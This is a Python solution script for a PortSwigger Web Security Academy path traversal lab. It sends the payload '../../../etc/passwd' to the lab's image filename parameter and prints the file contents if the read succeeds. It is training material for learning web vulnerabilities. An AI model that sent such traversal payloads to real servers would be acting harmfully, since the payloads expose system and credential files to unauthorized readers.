#!/usr/bin/env python3
"""
File path traversal, simple case
PortSwigger Web Security Academy -- Directory Traversal

Companion script for the writeup: 01-simple-case.md

What this does:
    Sends the basic traversal payload -- three levels of ../ prepended to
    etc/passwd -- to the product image loader's filename parameter. The
    endpoint has zero defenses, so the raw payload works on the first try.

Usage:
    python 01-simple-case.py <lab-url>
    e.g. python 01-simple-case.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

UNIX_CONFIRM_REGEX = re.compile(r"root:.*:0:0:")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    payload = "../../../etc/passwd"
    r = client.get(f"{lab_url}/image", params={"filename": payload})
    print(f"[*] GET /image?filename={payload}")
    print(f"[*] Response status: {r.status_code}, length: {len(r.text)} bytes")

    if UNIX_CONFIRM_REGEX.search(r.text):
        print("[+] /etc/passwd read successfully:")
        print(r.text)
    else:
        print("[-] Response did not contain /etc/passwd content.")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- traversal to /etc/passwd confirmed.")
    else:
        print("[-] Not solved yet -- inspect the response body above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
